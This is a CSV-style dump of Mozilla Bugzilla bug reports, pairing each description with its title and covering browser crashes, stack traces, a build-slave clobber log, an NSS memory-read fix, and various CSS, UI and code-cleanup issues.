25677,"+++ This bug was initially created as a clone of Bug #1591432 +++  This bug is for crash report bp-cd3d4836-a0b0-4f32-987b-faf500200114.  ``` Top 10 frames of crashing thread:  0 CoreText TFont::FindColourBitmapForGlyph const  1 CoreText TFont::CreatePathForGlyph const  2 CoreText CTFontCreatePathForGlyph  3 XUL SkScalerContext_Mac::generatePath gfx/skia/skia/src/ports/SkFontHost_mac.cpp:1561 4 XUL SkScalerContext::internalGetPath gfx/skia/skia/src/core/SkScalerContext.cpp:630 5 XUL SkScalerContext::getMetrics gfx/skia/skia/src/core/SkScalerContext.cpp:192 6 libmozglue.dylib BaseAllocator::malloc memory/build/mozjemalloc.cpp:3956 7 libmozglue.dylib operator new[] memory/mozalloc/cxxalloc.h:42 8 XUL SkGlyph::setPath gfx/skia/skia/src/core/SkGlyph.cpp:166 9 XUL SkTextBlob::getIntercepts const gfx/skia/skia/src/core/SkStrike.cpp:86  ```  after bug 1591432 seems to have fixed the problem in firefox 71, these tab crashes are spiking up again in 72.0 release and later. all the crashes are tab crashes coming from users on os x 10.9.  comments indicate that tabs are crashing repeatedly in some situations and some webmail urls are showing up frequently in submitted urls among other sites: https://webmail.plus.net/squirrelmail/src/webmail.php https://orange.safe-mail.net/cgi-bin/Safe-mail.net/display?N1P-yweVUujk&frames/frames.html https://webmail.cybermesa.com/src/webmail.php https://webmail.earthlink.net/wam/index.jsp?folder=INBOX.Trash https://webmail.lmi.net/src/webmail.php ...",Crash in [@ TFont::FindColourBitmapForGlyph]
25716,"In the spirit of ""testing the product in real-life usage scenarios,"" I was dutifully surfing pr0n sites. I was pleasantly astonished that not a single one was able to crash Mozilla... However, when looking for passwords for more pr0n sites to surf, I came across a crasher at http://www.ultrapasswordz.com.  I believe the crasher is the Flash on that page. It crashes Mozilla (branch, trunk, 4.x, everything) on Linux, but not on Windows. I can't get a decent stack trace, either -- it dies with an ""abort"" signal. I think an exception is being thrown and not caught:  (gdb) where #0  0x405b8dd1 in __kill () from /lib/libc.so.6 #1  0x402e0d5b in raise (sig=6) at signals.c:65 #2  0x405ba352 in abort () at ../sysdeps/generic/abort.c:88 #3  0x406d8f2b in __default_terminate () at ../../gcc/libgcc2.c:3034 #4  0x406d8f4a in __terminate () at ../../gcc/libgcc2.c:3034 #5  0x406d9c9a in throw_helper (eh=0x41f15658, pc=0x4268b389, my_udata=0xbfffefdc, offset_p=0xbfffefd8) at ../../gcc/libgcc2.c:3168 #6  0x406d9f4f in __rethrow (index=0x406f4058) at ../../gcc/libgcc2.c:3168 #7  0x406dc0cf in __builtin_vec_new (sz=2013269424) from /usr/lib/libstdc++-libc6.2-2.so.3 #8  0x4268b38a in ?? ()  I'll try to download and attach the flash app as a testcase here.",Flash on ultrapasswordz.com crashes browser on Linux
25718,"Created attachment 301936 testcase  See testcase, which crashes on current trunk build, but the Crash Reporter doesn't come up. In a debug build, I only get ntd.dll appear, so I guess it's a stack overflow crash or something like that.  It doesn't crash on branch (although I see ""text"" 2 times, which isn't really a good sign).  If wanted, I can look for the regression range.",Crash [@ no stack] with columns and large border-radius
25817,This bug was filed from the Socorro interface and is  report bp-29b34890-bc65-4f4e-89cf-82a610170807. =============================================================  There are 4 crashes in nightly 57 starting with builid 20170802100302.,Stylo: Crash in mozalloc_abort | abort | style::invalidation::element::invalidator::{{impl}}::process_invalidation<T>
25829,"This bug was filed from the Socorro interface and is  report bp-cd1980ab-afc8-4704-9dd8-947300171002. =============================================================  Seen while looking at crash stats for beta (and nightly): http://bit.ly/2wsP9DG. Seen in some 56 beta, but not 56 final. Windows 7 only. 57b4 209 crashes/99 installs.",Crash in BaseGetNamedObjectDirectory | mozilla::widget::WinUtils::WaitForMessage | nsAppShell::ProcessNextNativeEvent
25886,This bug is for crash report bp-ae8f31c4-4427-4c46-8a5f-da9f80190531.  LG device specific crash which affects API 26: https://bit.ly/2JSDjNE. Currently in 67 release this is the #15 top crash. Top crashing device is the LG G6.  We have a few other open bugs around LG crashing on specific APIs - Bug 1541912 is one of the more recent ones. and there also is Bug 1374570.  ``` Top 10 frames of crashing thread:  0 libc.so libc.so@0x4c8e8  1 libhwui.so libhwui.so@0x84466  2 libhwui.so libhwui.so@0x84466  3 libhwui.so libhwui.so@0x8e382  4 liblog.so liblog.so@0x66cb  5 libhwui.so libhwui.so@0x8516c  6 liblog.so liblog.so@0x66e6  7 boot-framework.oat boot-framework.oat@0x1465270  8 dalvik-main space (region space) (deleted) dalvik-main space @0x1cb36267  9 system@framework@boot-telephony-common.art system@framework@boot-telephony-common.art@0x16463   ```,Crash in [@ libhwui.so@0x84466]
25906,"On mozilla-central, bld-lion-r5-079 just busted a build for something that we knew needed a clobber: https://tbpl.mozilla.org/php/getParsedLog.php?id=12904192&tree=Firefox  That slave is marked as needing a clobber in the clobberer: https://build.mozilla.org/clobberer/?branch=mozilla-central  ""2012-06-17 06:33:35 PDT by ryanvm@<snip>""  ...but yet wasn't force clobbered.  In addition, the clobberer page shows an awful lot of slaves being marked as needing a clobber (and has done for a week or two now off the top of my head) - whereas before the ""last clobbered"" field would quickly clear as slaves were used.  CCing a few people who might be using the clobberer, to avoid future confusion over clobber-needed bustage.  ========= Started checking clobber times (results: 0, elapsed: 0 secs) (at 2012-06-22 08:36:39.904982) ========= python m-cen-osx-dbg/tools/clobberer/clobberer.py -s tools -t 168 http://build.mozilla.org/clobberer/index.php mozilla-central 'OS X 10.7 32-bit mozilla-central leak test build' m-cen-osx-dbg bld-lion-r5-079 http://buildbot-master34.srv.releng.scl3.mozilla.com:8001/  in dir /builds/slave/m-cen-osx-dbg/.. (timeout 3600 secs)  watching logfiles {}  argv: ['python', 'm-cen-osx-dbg/tools/clobberer/clobberer.py', '-s', 'tools', '-t', '168', 'http://build.mozilla.org/clobberer/index.php', 'mozilla-central', 'OS X 10.7 32-bit mozilla-central leak test build', 'm-cen-osx-dbg', 'bld-lion-r5-079', u'http://buildbot-master34.srv.releng.scl3.mozilla.com:8001/']  environment:   Apple_PubSub_Socket_Render=/tmp/launch-0tp3F8/Render   CVS_RSH=ssh   DISPLAY=/tmp/launch-XbrGbp/org.x:0   HOME=/Users/cltbld   LOGNAME=cltbld   PATH=/tools/buildbot/bin:/tools/python/bin:/opt/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin:/usr/X11/bin   PWD=/builds/slave   PYTHONPATH=/tools/buildbot/lib/python2.7/site-packages   SHELL=/bin/bash   SSH_AUTH_SOCK=/tmp/launch-3QT8k8/Listeners   TMPDIR=/var/folders/30/yq_p3wk15yb9wdsv6sm_m0v00000gn/T/   USER=cltbld   VERSIONER_PYTHON_PREFER_32_BIT=no   VERSIONER_PYTHON_VERSION=2.7   __CF_USER_TEXT_ENCODING=0x1F5:0:0  using PTY: False Checking clobber URL: http://build.mozilla.org/clobberer/index.php?master=http%3A%2F%2Fbuildbot-master34.srv.releng.scl3.mozilla.com%3A8001%2F&slave=bld-lion-r5-079&builddir=m-cen-osx-dbg&branch=mozilla-central&buildername=OS+X+10.7+32-bit+mozilla-central+leak+test+build m-aurora-osx-dbg:Our last clobber date:  2012-06-20 21:32:53 m-aurora-osx-dbg:Server clobber date:    2012-06-04 14:47:11 m-in-osx64:Our last clobber date:  2012-06-21 07:52:13 m-in-osx64:Server clobber date:    2012-06-21 07:52:13 m-cen-osx64:Our last clobber date:  2012-06-17 06:33:35 m-cen-osx64:Server clobber date:    2012-06-17 06:33:35 tb-comm-aurora-osx64-dbg:Our last clobber date:  2012-06-12 06:16:58 tb-comm-aurora-osx64-dbg:Server clobber date:    2012-06-04 13:10:11 m-beta-osx64-dbg:Our last clobber date:  2012-06-08 13:34:46 m-beta-osx64-dbg:Server clobber date:    2012-06-08 13:34:46 profiling-osx64-ntly:Our last clobber date:  2012-06-19 01:54:26 profiling-osx64-ntly:Server clobber date:    2012-06-19 01:54:26 m-in-osx64-lion-dbg-spidermonkey-nomethodjit:Our last clobber date:  2012-06-21 07:52:13 m-in-osx64-lion-dbg-spidermonkey-nomethodjit:Server clobber date:    2012-06-21 07:52:13 m-in-osx64-dbg:Our last clobber date:  2012-06-21 07:52:13 m-in-osx64-dbg:Server clobber date:    2012-06-21 07:52:13 ionmonkey-osx64-lion-dbg-spidermonkey-nomethodjit:Our last clobber date:  2012-06-08 02:33:56 ionmonkey-osx64-lion-dbg-spidermonkey-nomethodjit:Server clobber date:    2012-06-08 02:33:56 tb-comm-beta-osx64:Our last clobber date:  2012-06-18 11:48:06 tb-comm-beta-osx64:Server clobber date:    2012-06-18 11:48:06 srv-cen-osx64-dbg:Our last clobber date:  2012-06-13 09:02:01 srv-cen-osx64-dbg:Server clobber date:    2012-06-13 09:02:01 m-cen-osx64-xr:Our last clobber date:  2012-06-22 04:14:23 m-cen-osx64-xr:Server clobber date:    2012-06-22 04:14:23 m-aurora-osx64-ntly:Our last clobber date:  2012-06-12 04:20:32 m-aurora-osx64-ntly:Server clobber date:    2012-06-04 14:47:11 m-cen-osx-dbg:Our last clobber date:  2012-06-17 06:33:35 m-cen-osx-dbg:Server clobber date:    2012-06-17 06:33:35 m-cen-osx64-l10n-ntly:Our last clobber date:  2012-06-22 04:14:23 m-cen-osx64-l10n-ntly:Server clobber date:    2012-06-22 04:14:23 m-in-osx-dbg:Our last clobber date:  2012-06-21 07:52:13 m-in-osx-dbg:Server clobber date:    2012-06-21 07:52:13 pine-osx64:Our last clobber date:  2012-06-12 11:29:52 pine-osx64:Server clobber date:    2012-06-12 11:29:52 pine-osx64-dbg:Our last clobber date:  2012-06-20 14:28:02 pine-osx64-dbg:Server clobber date:    2012-06-12 11:29:52 ionmonkey-osx64:Our last clobber date:  None ionmonkey-osx64:Server clobber date:    2012-06-08 02:33:56 fx-team-osx64:Our last clobber date:  2012-06-19 01:54:17 fx-team-osx64:Server clobber date:    2012-06-19 01:54:17 srv-cen-osx-dbg:Our last clobber date:  2012-06-13 09:02:01 srv-cen-osx-dbg:Server clobber date:    2012-06-13 09:02:01 ionmonkey-osx64-dbg:Our last clobber date:  2012-06-08 02:33:56 ionmonkey-osx64-dbg:Server clobber date:    2012-06-08 02:33:56 tb-comm-cen-osx64:Our last clobber date:  2012-06-19 15:23:03 tb-comm-cen-osx64:Server clobber date:    2012-06-19 15:23:03 m-in-osx64-lion-dbg-spidermonkey-warnaserrdebug:Our last clobber date:  2012-06-21 07:52:13 m-in-osx64-lion-dbg-spidermonkey-warnaserrdebug:Server clobber date:    2012-06-21 07:52:13 m-in-osx64-ntly:Our last clobber date:  2012-06-21 07:52:13 m-in-osx64-ntly:Server clobber date:    2012-06-21 07:52:13 profiling-osx64:Our last clobber date:  2012-06-19 01:54:26 profiling-osx64:Server clobber date:    2012-06-19 01:54:26 program finished with exit code 0 elapsedTime=0.747198 ========= Finished checking clobber times (results: 0, elapsed: 0 secs) (at 2012-06-22 08:36:40.720191) =========",Slaves not clobbering when marked as needing one in the clobberer
25928,"I discovered that in the Makefile.in/Makefile for this area, it tested for Linuxsparc without Linuxsparc64, I will attach a patch to fix this.",build fails to produce proper binaries on Linux/sparc64
25949,"Created attachment 8637521 testcase  Assertion failure: outputTrack->GetEnd() == GraphTimeToStreamTime(interval.mStart) (Samples missing), at dom/media/TrackUnionStream.cpp:276","""Assertion failure: outputTrack->GetEnd() == GraphTimeToStreamTime(interval.mStart) (Samples missing)"" with navigation"
25952,"From Bugzilla Helper: User-Agent: Mozilla/4.06 (Macintosh; I; PPC, Nav) BuildID:    2000061411  It is possible, while Mozilla is loading, to switch to another application.  If  I send a QUIT AppleEvent from a program such as Memory Mapper or from a control  strip module, Mozilla will crash.  Reproducible: Always Steps to Reproduce: 1.Open Mozilla. 2.When you can, switch to a program capable of sending QUIT AppleEvents, and  send one to Mozilla.  Actual Results:  Mozilla crashes.  Expected Results:  Mozilla should have quit.  how: PowerPC access exception at 05D4DFFC NSGetModule+2C13C sc: Calling chain using A6/R1 links   Back chain  ISA  Caller   00000000    PPC  06082F7C     070A1A00    PPC  06073DF4     070A19A0    PPC  05F3FAF4  NS_ShutdownXPCOM(nsIServiceManager*)+00140   070A1890    PPC  05F09F08   nsServiceManager::ShutdownGlobalServiceManager(nsIServiceManager **)+00028   070A1840    PPC  05F09448  nsGetServiceByProgID::~nsGetServiceByProgID()+00534   070A1800    PPC  05F093A4  nsGetServiceByProgID::~nsGetServiceByProgID()+00490   070A17C0    PPC  05F047B0  nsObjectHashtable::~nsObjectHashtable()+00020   070A1780    PPC  05F048F4  nsObjectHashtable::Reset()+00014   070A1740    PPC  05F04430  nsHashtable::Reset(int (*)(nsHashKey*, void*, void* ), void*)+000 2C   070A1700    PPC  0600AAD8  PL_HashTableEnumerateEntries+00060   070A1690    PPC  05F043A4  nsHashtable::Enumerate(int (*)(nsHashKey*, void*,  void*), void*) +00060   070A1650    PPC  05F09294  nsGetServiceByProgID::~nsGetServiceByProgID()+00380   070A1610    PPC  05DD199C  NSGetModule+00694   070A15D0    PPC  05DD1834  NSGetModule+0052C   070A1560    PPC  05DCA418     070A1520    PPC  05DCCD00     070A1470    PPC  05DE0EB0  NS_NewScriptXPConnectFactory+0A8A4   070A1370    PPC  05F8A50C  nsGetInterface::nsGetInterface(nsISupports*,  unsigned int*)+03A0 4   070A1320    PPC  05F960D8  NS_NewWebShellFactory+09ED4   070A12C0    PPC  05F839D4  NS_TotalWebShellsInExistence+00754   070A1280    PPC  05F0B8AC  nsCOMPtr_base::assign_with_AddRef(nsISupports*)+ 00048   070A1240    PPC  059FD724  nsStyleChangeList::Clear()+1067C   070A1200    PPC  059FDBB4  nsStyleChangeList::Clear()+10B0C   070A1160    PPC  05CE79B0",crash on startup when QUIT AppleEvent sent
25970,"This bug was filed from the Socorro interface and is  report bp-9880d167-301e-4a02-96af-f16552160915. =============================================================  This isn't a super common crash, but it looks like it is trying to allocate more than 400MB. Ideally this would be a fallible crash.",Crash in OOM | large | mozalloc_abort | mozalloc_handle_oom | moz_xmalloc | SkChunkAlloc::newBlock
25981,Created attachment 609241 logs when opening the link  Fennec/14.0a1 2012-03-23 Device: Motorola Droid 2 (Android 2.3)/ Google Nexus S ( Android 2.3.6)  Steps to reproduce: 1. Go to: http://www.race.u-tokyo.ac.jp/~uchida/blogdata/dataset1_community_large.png ( shortlink goo.gl/IC0pn) 2. Wait for the image to load. - the image resolution is 8000x6000.  Expected results: The page can be loaded or image fails to load without crashing Nightly.  Actual results: The device runs out of memory and Nightly is closed.  Notes: The issue is not reproducible on the Android Browser,Loading very large images causes Fennec to crash (OOM)
26048,Filed by: wkocher [at] mozilla.com  https://treeherder.mozilla.org/logviewer.html#?job_id=128472159&repo=autoland  https://queue.taskcluster.net/v1/task/OEL-03itQ8WQy-8J7h5Eug/runs/0/artifacts/public/logs/live_backing.log,Intermittent devtools/client/webconsole/test/browser_webconsole_view_source.js | application crashed [@ mozilla::detail::MutexImpl::lock]
26104,"Filed by: csabou [at] mozilla.com  https://treeherder.mozilla.org/logviewer.html#?job_id=157455370&repo=mozilla-central  https://queue.taskcluster.net/v1/task/WPa9PcWyS-enzq-16hGE4g/runs/0/artifacts/public/logs/live_backing.log  [task 2018-01-19T19:20:30.779Z] 19:20:30     INFO -  TEST-START | security/manager/ssl/tests/unit/test_toolkit_securityreporter.js [task 2018-01-19T19:20:37.371Z] 19:20:37  WARNING -  TEST-UNEXPECTED-FAIL | security/manager/ssl/tests/unit/test_toolkit_securityreporter.js | xpcshell return code: 139 [task 2018-01-19T19:20:37.372Z] 19:20:37     INFO -  TEST-INFO took 6592ms [task 2018-01-19T19:20:37.372Z] 19:20:37     INFO -  >>>>>>> [task 2018-01-19T19:20:37.372Z] 19:20:37     INFO -  security/manager/ssl/tests/unit/test_toolkit_securityreporter.js | xpcw: cd /storage/sdcard/tests/xpc/security/manager/ssl/tests/unit [task 2018-01-19T19:20:37.374Z] 19:20:37     INFO -  security/manager/ssl/tests/unit/test_toolkit_securityreporter.js | xpcw: xpcshell -r /storage/sdcard/tests/xpc/c/httpd.manifest --greomni /data/local/xpcb/target.apk -m -s -e const _HEAD_JS_PATH = ""/storage/sdcard/tests/xpc/head.js""; -e const _MOZINFO_JS_PATH = ""/storage/sdcard/tests/xpc/p/mozinfo.json""; -e const _TESTING_MODULES_DIR = ""/storage/sdcard/tests/xpc/m""; -f /storage/sdcard/tests/xpc/head.js -e const _SERVER_ADDR = ""localhost"" -e const _HEAD_FILES = [""/storage/sdcard/tests/xpc/security/manager/ssl/tests/unit/head_psm.js""]; -e const _JSDEBUGGER_PORT = 0; -e const _TEST_FILE = [""test_toolkit_securityreporter.js""]; -e const _TEST_NAME = ""security/manager/ssl/tests/unit/test_toolkit_securityreporter.js"" -e _execute_test(); quit(0); [task 2018-01-19T19:20:37.374Z] 19:20:37     INFO -  security/manager/ssl/tests/unit/test_toolkit_securityreporter.js | [7435, Unnamed thread 46d0d080] WARNING: XPCOM objects created/destroyed from static ctor/dtor: file /builds/worker/workspace/build/src/xpcom/base/nsTraceRefcnt.cpp, line 171 [task 2018-01-19T19:20:37.375Z] 19:20:37     INFO -  security/manager/ssl/tests/unit/test_toolkit_securityreporter.js | [7435, Main Thread] WARNING: Couldn't get the user appdata directory. Crash events may not be produced.: file /builds/worker/workspace/build/src/toolkit/crashreporter/nsExceptionHandler.cpp, line 2734 [task 2018-01-19T19:20:37.376Z] 19:20:37     INFO -  security/manager/ssl/tests/unit/test_toolkit_securityreporter.js | Segmentation fault [task 2018-01-19T19:20:37.376Z] 19:20:37     INFO -  security/manager/ssl/tests/unit/test_toolkit_securityreporter.js | 13 [task 2018-01-19T19:20:37.377Z] 19:20:37     INFO -  <<<<<<< [task 2018-01-19T19:20:37.702Z] 19:20:37     INFO -  mozcrash Copy/paste: /builds/worker/workspace/build/linux64-minidump_stackwalk /tmp/tmp33Xzxx/70b090ff-b3b4-49b8-df70-dd40faeb5e22.dmp /builds/worker/workspace/build/symbols [task 2018-01-19T19:20:39.273Z] 19:20:39     INFO -  mozcrash Saved minidump as /builds/worker/workspace/build/blobber_upload_dir/70b090ff-b3b4-49b8-df70-dd40faeb5e22.dmp [task 2018-01-19T19:20:39.273Z] 19:20:39     INFO -  mozcrash Saved app info as /builds/worker/workspace/build/blobber_upload_dir/70b090ff-b3b4-49b8-df70-dd40faeb5e22.extra [task 2018-01-19T19:20:39.274Z] 19:20:39  WARNING -  PROCESS-CRASH | security/manager/ssl/tests/unit/test_toolkit_securityreporter.js | application crashed [@ libxul.so + 0x73bce] [task 2018-01-19T19:20:39.274Z] 19:20:39     INFO -  Crash dump filename: /tmp/tmp33Xzxx/70b090ff-b3b4-49b8-df70-dd40faeb5e22.dmp",Intermittent security/manager/ssl/tests/unit/test_toolkit_securityreporter.js | application crashed [@ libxul.so + 0x73bce]
26310,"When we clear the main controller, we only reset its playback state [1]. We should clear its metadata as well.  [1] https://searchfox.org/mozilla-central/rev/aec63591821712236a522f7f55116f582ed7c920/dom/media/mediacontrol/MediaControlService.cpp#339-341",Reset event source's metadata when we clear main controller
26325,"https://searchfox.org/mozilla-central/rev/7fd1c1c34923ece7ad8c822bee062dd0491d64dc/testing/mozbase/mozrunner/mozrunner/devices/android_device.py#20  psutil is used only by one function in that module, and that function is not called by most clients of that module. Let's reduce scope to avoid a dependency for most callers.",android_device.py imports psutil
26392,"NSS function getLibName calls sysinfo() and then uses strstr to scan the  result buffer for a certain string.  The code is:  >  74 const static char int_hybrid_isa[] = ""sparcv8plus""; >  75 const static char fpu_hybrid_isa[] = ""sparcv8plus+vis"";  >  82     char * found_int_hybrid; >  83     char * found_fpu_hybrid; >  84     long buflen; >  85     char buf[256]; >  86  >  87     buflen = sysinfo(SI_ISALIST, buf, sizeof buf); >  88     if (buflen <= 0)  >  89         return NULL;  >  97     found_int_hybrid = strstr(buf, int_hybrid_isa); >  98     found_fpu_hybrid = strstr(buf, fpu_hybrid_isa);  Purify reports UMR (Uninitialized Memory Reads) occurring in those two calls to strstr.  We believe the only way UMRs can occur in strstr is if the buffer ""buf"" is not NUL terminated.  Solaris's sysinfo(2) man page says:  > SYNOPSIS >       #include <sys/systeminfo.h> >       long sysinfo(int command, char *buf, long count);  > RETURN VALUES >  > Upon successful completion, the value returned indicates the buffer size in  > bytes required to hold the complete value and the terminating null character. > If this value is no greater than the value passed in count, the entire string > was copied. If this value is greater than count, the string copied into buf > has been truncated to count -1 bytes plus a terminating null character. >  > Otherwise, -1 is returned and errno is set to indicate the error.  Notice that the above text asserts that the string copied into buf will contain a ""terminating null character"", unless the returned value is -1. Nevertheless, Purify's output seems to suggest it is not NUL terminated.  Work around: NUL pad the result in buf before calling strstr.",Fix UMRs in getLibName()
26540,"[Affected versions]: - Latest Nightly 53.0a1 - Latest Developer Edition 52.0a2  [Affected platforms]: - Windows 8.1 32-bit - Windows 10 64-bit - Ubuntu 16.04 64-bit - Mac OS X 10.12.1  [Steps to reproduce]: 1. Start Firefox 2. Install a dark theme (https://addons.mozilla.org/en-US/firefox/addon/devedition-theme-enabler/) 2. Visit a random webpage 3. Enter RDM (CTRL+Shift+M / CMD+Alt+M) 4. Click the value of DPR 5. Select a Device from dropdown 6. Click the value of DPR  [Expected result]: - The disabled dropdown/actions are visible faded out.  [Actual result]: - No actual visible way of telling if DPR is clickable or not.  [Regression range]: - This is not a recent regression, it's the same behavior on old Nightly from 2016-11-08 where DPR was enabled for the first time.  [Additional notes]: - On a non dark theme, DPR is more visible faded out but it and 'No throttling' are always like that until you hover over them (when no devices are selected).",Show that DPR is not changeable in a better way once you select a device (dark theme)
26541,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0 Build ID: 20161209150850  Steps to reproduce:  1. start firefox 2. visit e.g.: www.faz.net 3. Screen position is manipulated, so ads are visible   Actual results:  Screen position manipulated via slidebar right hand side   Expected results:  Screen position should not be manipulated","Scroll position is manipulated, so ads are shown on the page"
26584,"Since Treeherder defaults to mozilla-inbound, it might also make sense for:  o Perfherder > Graphs > Add test data > Project (dropdown) o Perfherder > Compare > Project (dropdown)  ..to default to mozilla-inbound also.  Currently they default to mozilla-central.",Switch Perfherder project dropdowns to default to mozilla-inbound
26722,"Reproduction: 1. Have several accounts already set up 2. Go to Edit|Account Settings... window, select an account 3. Click button Account Actions | Add Mail Account... 4. Walk through wizard, finish it successfully  Actual result: - The account selected in step 2 is still selected  Expected result: - The newly created account is selected","Automatically select newly created account, when created from Account Manager"
26770,"*** Original post on bio 2081 at 2013-07-30 18:19:00 UTC ***  As pressing 'down' from the filterbox selects the first row, and it should be possible to undo this the intuitive way.",Better handling of navigation keys between the filterbox and listbox
26786,"User-Agent:       Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.3b) Gecko/20030121 Build Identifier: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.3b) Gecko/20030121  My GTK+ 2.x font is 7.5pt.  (7pt is too small, 8pt is too large). This is fine as GTK+ 2.x uses Pango to render, and Pango draws in 1000ths of a point.  Mozilla is getting my GTK+ font size (7.5pt), forcing it into an integer (7) and then reapplying that style to GTK+ widgets. Thus all of the widgets in HTML pages are too small in Galeon2 :(  Reproducible: Always  Steps to Reproduce: Set the GTK+ font size to a non-integer value and run a GTK+ 2 Mozilla.","[gtk2] Assumes font sizes are integers, they are not"
26798,"In Addressbook -> Import->Addressbooks -> ""text files (.csv,.ldif,.txt)"" a file picker opens. Of Cancel is clicked, it is closed and the previous dialog is shown, but an error is dumped in console: NS_ERROR_MALFORMED_URI: Component returned failure code: 0x804b000a (NS_ERROR_MALFORMED_URI) [nsIFilePicker.file] importDialog.js:613""",Error when canceling addressbook import file picker
26823,"Mozilla build and Netscape 7.0 have conflicting settings.... (such as themes and personal setups).  They elimiante each others (personal) setting, and reset the   browsers back to defaults.   Just a minor announce.... please look into this so both browsers can both run independently on the same pc... Thanks Kevin J. Wright",Browser conflicts
26907,"User-Agent:       Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.6) Gecko/20050317 Firefox/1.0.1 Build Identifier: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.6) Gecko/20050317 Firefox/1.0.1  I changed my IMAP password, how do I get rid of a cached password?      In the menu, select Tools > Options..., click on Advanced, expand the Passwords section and click Manage Stored Passwords. Select the site/username line you want to delete and click Remove. When done, click Close and restart Mozilla Thunderbird.   Reproducible: Always  Actual Results:   I changed my IMAP password, how do I get rid of a cached password?      In the menu, select Tools > Options..., click on Advanced, expand the Passwords section and click Manage Stored Passwords. Select the site/username line you want to delete and click Remove. When done, click Close and restart Mozilla Thunderbird.   Expected Results:   should read: In the menu . select Edit > Preferences...... Click on Advanced.......(and so on)",Wrong steps given to change IMAP account password
26913,js> [2for (x in [3])]  [2]  I did not expect this to be accepted.,"Unexpected lexing: ""2for"" is accepted in array comprehension"
26981,"User-Agent:       Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060407 Firefox/1.5.0.1 Build Identifier: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060407 Firefox/1.5.0.1  I'm using NSS 3.11 and on line 93 of cryptohi.h it shows an example signing algorithm to use as SEC_OID_RSA_WITH_MD5 which doesn't appear to exist anymore.  I ended up using SEC_OID_PKCS1_MD5_WITH_RSA_ENCRYPTION from secoidt.h which did work.  Am I correct in assuming the latter is equal to the former in the current state of NSS?  Link to new OID: http://lxr.mozilla.org/security/source/security/nss/lib/util/secoidt.h#86  Reproducible: Always    Expected Results:   An example algorithm that points developers in the right direction, possibly using one with one of the newer SHA algorithms as MD5 is fairly broken.",non-existant SECOidTag referenced in cryptohi.h?
27027,"The copyright year range in FizzillaMach/2003021017's CFBundleGetInfoString long version string is delineated with a hyphen (1998-2002). Typographically, it is preferable to use an en dash (Ux2013) to delineate such ranges.","Use en-dash, rather than hyphen, in copyright year range in CFBundleGetInfoString"
27135,"Build ID: 2001-06-12-08, Mac Classic   There exists an extra small box the size of the offline indicator, which is to the left of the Done. status.    Note: On Mac Modern, there is a blank SPACE, but not a square.  Whatever code is causing this same bug.",Extra blank box to the left of 'Done.' on mac classic skin.
27136,"We should change the templates using containing <label> syntax (<label><element>text</label>) to use the indirect idref syntax (<label for=""someid"">text</label><input id=""someid"" ...>, since Windows IE's up to version 5.5 do not implement the containing syntax version properly (the labels are not clickable).   There aren't too many instances of this yet, so it should be an easy fix.","Should replace <label>s with <label for="""">s"
27177,"The line friend class mozilla::AutoRestore<bool>; in nsContentUtils.h is unnecessary and, thus, should go away.",Remove unnecessary friend class mozilla::AutoRestore<bool> from nsContentUtils
27255,"When looking at brand.dtd in chrome/en-US.jar in a current Firefox nightly build, the brand.dtd looks like this: <!ENTITY  lang.version          ""1.7a""> <!ENTITY  brandShortName        ""Firefox""> <!ENTITY  brandFullName         ""Mozilla Firefox""> <!ENTITY  version                ""0.8.0+"" > <!ENTITY  vendorShortName       ""Mozilla"">  <!ENTITY  releaseURL            ""http://www.mozilla.org/products/firefox/releases/0.8.html"">  I think the linebreak after version is wrong here, the line should rather look like this: <!ENTITY  version               ""0.8.0+"">",brand.dtd malformed
27261,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.7.3) Gecko/20040913 Firefox/0.10 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.7.3) Gecko/20040913 Firefox/0.10  when adding  to body style (directly or via CSS) the ""overflow-x: hidden"" does not work, and it still keep showing horizontal scrollbars. For exampel if i'm adding to my body: <body style=""overflow-x: hidden;""> or adding it via external css file: body { overflow-x: hidden; } The site will still show with horizontal scrollbars.  Reproducible: Always Steps to Reproduce: 1. create a page with 100% width table 2. fill it with big picture 3. add style=""overflow-x: hidden;"" to <BODY> tag. 4. save file & view it to see the bug.  Actual Results:   The site will still show with horizontal scrollbars, even it's not supposed to be like that.  Expected Results:   hide the horizontal scrollbars & show only vertical scrollbars.",overflow-x css / style not working
27298,utilityOverlay.js needs to be cleaned and split into multiple files. There are lots of functions in that file that need to be split into other JS files.  I'll fix this bug around the next alpha cycle.,utilityOverlay.js needs cleaning
27323,"Sync' with Thunderbird, in order to ease bug 537219, etc.  Port ""backend"" code part of http://bonsai.mozilla.org/cvsquery.cgi?module=ThunderbirdTinderbox&sortby=Date&hours=2&date=explicit&mindate=2003-08-03+23%3A36&maxdate=2003-08-03+23%3A36 ""Add a new quote button for quoting the selected message like Netscape 4.x""  NB: We might want to actually add a button too, but I'll leave that to someone else in another bug.",Move updateOptionItems() call from xul to js
27324,"NB: For this bug, I am ignoring config* files.",Remove some WINCE leftovers in comm-central
27410,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7) Gecko/20040514 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7) Gecko/20040514  this is the code, html validator from www.w3.org says it's ok:  <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 4.0 Transitional//EN""> <HTML> <HEAD>   <META HTTP-EQUIV=""content-type"" CONTENT=""text/html; charset=UTF-8"">   <TITLE> titulok </TITLE>   <LINK rel=""stylesheet"" type=""text/css"" href=""default.css"">  </HEAD> <BODY>   <DIV STYLE=""background:#CD9F72; padding-left:0 em;"">     aa   </DIV><BR>   <DIV STYLE=""background:#CD9F72; padding-left:20 em;"">     bb   </DIV><BR> </BODY> </HTML>  Reproducible: Always Steps to Reproduce: 1. 2. 3.",margin-left and padding-left is ignored at some places
27452,"Created attachment 333876 Correcting a mistranslated sentence  When you right-click, the text for ""Search Google for %S"" is mistranslated.",Wrong text on contextual menu for searching.
